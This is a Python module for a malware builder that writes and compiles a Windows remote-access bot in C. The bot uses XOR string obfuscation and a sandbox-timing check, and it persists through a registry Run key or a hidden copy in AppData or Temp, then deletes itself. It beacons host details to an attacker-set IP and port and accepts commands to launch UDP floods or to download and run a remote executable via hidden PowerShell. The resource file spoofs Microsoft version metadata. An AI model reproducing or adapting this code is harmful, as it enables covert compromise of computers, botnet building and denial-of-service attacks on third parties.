import os
import subprocess
import random
from tkinter import messagebox
from .utils import xor_enc

def build_payload(ip, port, name, file_type, drop_loc, persist, hide, self_del):
    """Generates and compiles the payload."""
    keys = [random.randint(64, 127) for _ in range(4)]
    key_str = ", ".join([hex(k) for k in keys])
    
    is_dll = file_type == "DLL"
    ext = "dll" if is_dll else "exe"
    
    if drop_loc == "Startup":
        # Use Registry for Startup
        reg_path = "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run"
        tp_path = f'char s_r[] = "{xor_enc(reg_path, keys)}"; processData(s_r, {len(reg_path)}); HKEY h; if(RegOpenKeyExA((HKEY)0x80000001, s_r, 0, 0x0002, &h) == 0) {{ RegSetValueExA(h, "{name}", 0, 1, (BYTE*)cp, strlen(cp)); RegCloseKey(h); }} sprintf(tp, "%s", cp);'
    else:
        e_v = {"AppData": "APPDATA", "LocalAppData": "LOCALAPPDATA", "Temp": "TEMP"}[drop_loc]
        tp_path = f'char s_ev[] = "{xor_enc(e_v, keys)}"; processData(s_ev, {len(e_v)}); sprintf(tp, "%s\\\\{name}.exe", getenv(s_ev));'
    
    hide_cmd = 'SetFileAttributesA(tp, 0x02 | 0x04);' if hide else ''
    del_cmd = 'char dc[512]; sprintf(dc, "cmd.exe /c timeout /t 3 & del \\"%s\\"", cp); ShellExecuteA(0, "open", "cmd.exe", dc, 0, 0);' if self_del else ''
    
    stealth_logic = ""
    if persist and not is_dll:
        stealth_logic = f"""
        char cp[260], tp[260]; GetModuleFileNameA(0, cp, 260);
        {tp_path}
        if (!strstr(cp, tp)) {{
            if (CopyFileA(cp, tp, FALSE)) {{
                {hide_cmd}
                ShellExecuteA(0, "open", tp, 0, 0, 0);
                {del_cmd}
                exit(0);
            }}
        }}"""

    entry_point = """
__declspec(dllexport) void __cdecl thread_logic(void* arg) { runDiagnostics(); }
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {
    if(r==1) { WSADATA w; WSAStartup(0x0202, &w); _beginthread((void*)thread_logic, 0, NULL); }
    return TRUE;
}
""" if is_dll else """
int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR c, int s) { WSADATA w; WSAStartup(0x0202, &w); runDiagnostics(); return 0; }
"""

    c_source = f"""#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <process.h>
#include <wincrypt.h>
#include <bcrypt.h>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")

int ATK = 0; char TD[256];
void processData(char* s, int l) {{ 
    char k[] = {{{key_str}}};
    for(int i=0; i<l; i++) s[i] ^= k[i % 4]; 
}}

typedef HINSTANCE (WINAPI* SEW)(HWND, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, INT);
void SE(char* c){{ 
    char b_s[] = "{xor_enc("cmd.exe", keys)}"; processData(b_s, 7);
    char b_p[] = "{xor_enc("/c \\\"%s\\\"", keys)}"; processData(b_p, 8);
    char s_sh[] = "{xor_enc("shell32.dll", keys)}"; processData(s_sh, 11);
    char s_se[] = "{xor_enc("ShellExecuteW", keys)}"; processData(s_se, 13);
    SEW f = (SEW)GetProcAddress(GetModuleHandleA(s_sh), s_se);
    char buf[8192]; sprintf(buf, b_p, c);
    wchar_t wbuf[8192], wcmd[256]; 
    MultiByteToWideChar(0,0,buf,-1,wbuf,8192); MultiByteToWideChar(0,0,b_s,-1,wcmd,256);
    if(f) f(0, L"open", wcmd, wbuf, 0, 0); 
}}

unsigned __stdcall dos(void* p){{
    char ip[99];int sP,eP,sz,dl; sscanf(TD,"%[^:]:%d:%d:%d:%d",ip,&sP,&eP,&sz,&dl);
    SOCKET s=socket(2,2,0); struct sockaddr_in a; a.sin_family=2; char* b=malloc(sz);
    while(ATK){{
        a.sin_port=htons((rand()%(eP-sP+1))+sP); a.sin_addr.s_addr=inet_addr(ip);
        sendto(s,b,sz,0,(struct sockaddr*)&a,sizeof(a)); if(dl>0)Sleep(dl);
    }}
    return 0;
}}

void runDiagnostics() {{
    unsigned long long t1 = GetTickCount64(); Sleep(4000);
    if ((GetTickCount64() - t1) < 3900) return; 
    
    char bloom[1024*80]; for(int i=0; i<81920; i++) bloom[i] = (char)(i % 123 + i % 13);
    
    {stealth_logic}
    while(1) {{
        SOCKET s = socket(2, 1, 0);
        struct sockaddr_in a = {{ 0 }};
        a.sin_family = 2; a.sin_port = htons({port}); a.sin_addr.s_addr = inet_addr("{ip}");
        if(connect(s, (struct sockaddr*)&a, sizeof(a)) == 0) {{
            char info[1024];
            char s_u[] = "{xor_enc("USERNAME", keys)}"; processData(s_u, 8);
            char s_cn[] = "{xor_enc("COMPUTERNAME", keys)}"; processData(s_cn, 12);
            char s_pi[] = "{xor_enc("PROCESSOR_IDENTIFIER", keys)}"; processData(s_pi, 20);
            sprintf(info, "User: %s\\nPC: %s\\nOS: Win\\nCPU: %s", getenv(s_u), getenv(s_cn), getenv(s_pi));
            send(s, info, strlen(info), 0);
            while(1) {{
                char b[2048] = {{0}}; int l = recv(s, b, 2048, 0);
                if(l <= 0) break;
                char *c = b, *p = NULL;
                char *p1 = strchr(b, '|');
                if(p1) {{ *p1 = 0; p = p1 + 1; }}
                if(!c) continue;

                if(!strcmp(c,"DOS") && p){{ ATK=0; Sleep(200); ATK=1; strcpy(TD, p); _beginthreadex(0, 0, (unsigned (__stdcall *)(void *))dos, 0, 0, 0); }}
                if(!strcmp(c,"STOP_DOS")){{ ATK=0; }}
                if(!strcmp(c,"UPDATE") && p){{ 
                    char up_s[] = "{xor_enc("powershell -W Hidden -c \\\"curl -o $env:TEMP/n.exe %s; start $env:TEMP/n.exe\\\"", keys)}";
                    processData(up_s, {len("powershell -W Hidden -c \\\"curl -o $env:TEMP/n.exe %s; start $env:TEMP/n.exe\\\"")});
                    char cmd[1024]; sprintf(cmd, up_s, p); SE(cmd); exit(0); 
                }}
                if(!strcmp(c,"STOP")){{ exit(0); }}
            }}
            closesocket(s);
        }}
        Sleep(5000);
    }}
}}

{entry_point}
"""
    # Write temp files
    with open("temp.c", "w", encoding="utf-8") as f: f.write(c_source)
    
    rc_source = f"""
1 VERSIONINFO
FILEVERSION 1,0,0,0
PRODUCTVERSION 1,0,0,0
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904b0"
        BEGIN
            VALUE "CompanyName", "Microsoft Corporation"
            VALUE "FileDescription", "Windows Host Process"
            VALUE "FileVersion", "1.0.0.0"
            VALUE "InternalName", "{name}"
            VALUE "LegalCopyright", "© Microsoft Corporation. All rights reserved."
            VALUE "OriginalFilename", "{name}.{ext}"
            VALUE "ProductName", "Microsoft Windows Operating System"
            VALUE "ProductVersion", "1.0.0.0"
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x409, 1200
    END
END
1 RT_MANIFEST "temp.manifest"
"""
    manifest_source = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
    <security>
      <requestedPrivileges>
        <requestedExecutionLevel level="asInvoker" uiAccess="false"/>
      </requestedPrivileges>
    </security>
  </trustInfo>
</assembly>"""
    
    with open("temp.rc", "w", encoding="utf-8") as f: f.write(rc_source)
    with open("temp.manifest", "w", encoding="utf-8") as f: f.write(manifest_source)
    
    compile_flag = "-shared" if is_dll else "-mwindows"
    
    # Compile Resource
    subprocess.run("windres temp.rc -o res.o", shell=True)
    # Compile EXE/DLL with Resource
    res = subprocess.run(f"gcc temp.c res.o -o {name}.{ext} -lws2_32 -lcrypt32 -lbcrypt {compile_flag}", shell=True)
    
    # Cleanup
    for f in ["temp.c", "temp.rc", "temp.manifest", "res.o"]:
        if os.path.exists(f): os.remove(f)
        
    if res.returncode == 0:
        messagebox.showinfo("Done", f"Built: {name}.{ext}")
    else:
        messagebox.showerror("Error", "Compilation failed.")
